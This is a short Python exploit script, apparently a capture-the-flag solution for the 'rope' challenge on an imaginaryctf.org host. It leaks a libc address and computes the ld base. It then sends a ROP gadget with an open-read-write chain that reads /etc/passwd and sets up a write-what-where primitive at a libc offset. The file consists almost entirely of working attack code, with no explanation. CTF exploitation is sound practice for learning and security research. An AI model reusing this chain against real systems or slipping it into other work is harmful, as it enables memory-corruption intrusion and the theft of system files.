#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./vuln")
host = args.HOST or "rope.chal.imaginaryctf.org"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
b *main+178
continue
b *0x7ffff7de7e23
""".format(
    **locals()
)

ld = ELF("./ld-2.23.so")
libc = SetupLibcELF()
io = start()
libc.address = GetInt(rl())[0] - libc.sym.puts
ld.address = libc.address + 0x3CA000
lb()
sl(p(libc.address + 0x00000000001154A1) + ORW(0xB16B00B) + b"/etc/passwd")
sl(str(libc.address + 0x5F1168))  # write where
sl(str(680 + 16))  # write what
# sl(str(16))  # write what
io.interactive()
